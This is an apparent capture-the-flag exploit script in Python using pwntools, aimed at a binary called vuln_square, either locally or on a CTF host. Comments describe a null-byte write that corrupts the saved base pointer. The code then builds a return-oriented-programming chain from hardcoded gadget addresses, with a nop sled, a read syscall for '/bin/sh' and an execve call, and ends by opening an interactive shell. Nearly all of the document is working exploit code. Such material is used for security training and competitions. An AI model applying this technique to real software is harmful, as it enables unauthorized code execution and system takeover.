# The vulnerability is a a write of 0 after the input has been inserted.
# By inserting 0x100 bytes the 0 write will overwrite the rbp, leading to a return to our input.
# In the input a rop chain will be inserted that will perform a read for /bin/sh and then a call to execve.
# Starting with some nop to be sure that because of the randomization of the stack,
#  my rop_chain would be executed
# Several gadgets are used to correctly set the parameters


from pwn import *


CHALL_PATH = "./vuln_square"
COMMANDS = """
b *0x4019a6
c
"""

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
elif args.REM:
    c = remote("vuln-square.ctf.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)

nop_ret = 0x40183f
pop_rax = 0x427fab
syscall = 0x411006
xor_edi = 0x45f99a
xor_edx = 0x404729
pop_rsi_rbp = 0x40a482
mov_rax_rsi = 0x404c6e
mov_rdi_rax = 0x404c66
mov_rdx_rsi = 0x41cbb7
pop_rsi_rbp = 0x40a482

payload = b""

for i in range(0x10):
    payload += p64(nop_ret) # Initial nops


# Open read to get /bin/sh
payload += p64(xor_edi) # Set the fd
payload += p64(pop_rax) # Set the syscall num
payload += p64(0)
payload += p64(syscall)

# Prepare for execve
payload += p64(mov_rax_rsi) # Move /bin/sh from rsi to rdi via rax
payload += p64(mov_rdi_rax) # Move /bin/sh from rsi to rdi via rax
payload += p64(xor_edx) # Set rdx to 0
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rsi_rbp) # Set rsi to 0
payload += p64(0)
payload += p64(0)
payload += p64(pop_rax) # Set the valid syscall num
payload += p64(0x3b)
payload += p64(syscall)

print(len(payload))

c.recvuntil(b"name?")

c.send(payload)

c.sendline(b"/bin/sh\0")
c.interactive()